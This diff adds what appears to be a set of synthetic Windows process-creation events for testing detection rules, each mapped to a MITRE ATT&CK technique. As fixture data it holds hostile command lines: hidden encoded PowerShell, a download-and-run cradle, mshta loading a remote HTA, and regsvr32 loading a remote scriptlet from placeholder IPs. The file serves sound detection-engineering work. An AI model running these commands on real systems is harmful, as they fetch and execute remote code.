@@ -1,0 +1,77 @@
+id: SC-W-001
+name: Encoded PowerShell launched from a script host
+technique: T1059.001
+tactic: execution
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    CommandLine: 'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=='
+    ParentImage: 'C:\Windows\System32\wscript.exe'
+    User: 'CORP\jsmith'
+---
+id: SC-W-002
+name: PowerShell with abbreviated -e encoded argument
+technique: T1059.001
+tactic: execution
+note: Uses the short `-e` form. Rules matching only -enc / -encodedcommand / -ec will miss it.
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    CommandLine: 'powershell.exe -nop -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA='
+    ParentImage: 'C:\Windows\System32\cmd.exe'
+    User: 'CORP\jsmith'
+---
+id: SC-W-003
+name: Word document launches cmd.exe
+technique: T1204.002
+tactic: execution
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\cmd.exe'
+    CommandLine: 'cmd.exe /c powershell -c "iwr http://198.51.100.20/s.ps1 | iex"'
+    ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+    User: 'CORP\akhan'
+---
+id: SC-W-004
+name: Excel launches mshta
+technique: T1204.002
+tactic: execution
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\mshta.exe'
+    CommandLine: 'mshta.exe C:\Users\akhan\AppData\Local\Temp\invoice.hta'
+    ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE'
+    User: 'CORP\akhan'
+---
+id: SC-W-005
+name: IIS worker process runs whoami via cmd
+technique: T1505.003
+tactic: persistence
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\cmd.exe'
+    CommandLine: 'cmd.exe /c whoami /all'
+    ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+    User: 'IIS APPPOOL\DefaultAppPool'
+---
+id: SC-W-006
+name: mshta executes remote HTA
+technique: T1218.005
+tactic: defense_evasion
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\mshta.exe'
+    CommandLine: 'mshta.exe http://203.0.113.9/update.hta'
+    ParentImage: 'C:\Windows\explorer.exe'
+    User: 'CORP\jsmith'
+---
+id: SC-W-007
+name: regsvr32 loads remote scriptlet
+technique: T1218.010
+tactic: defense_evasion
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\regsvr32.exe'
+    CommandLine: 'regsvr32.exe /s /n /u /i:http://203.0.113.9/a.sct scrobj.dll'
+    ParentImage: 'C:\Windows\System32\cmd.exe'
+    User: 'CORP\jsmith'
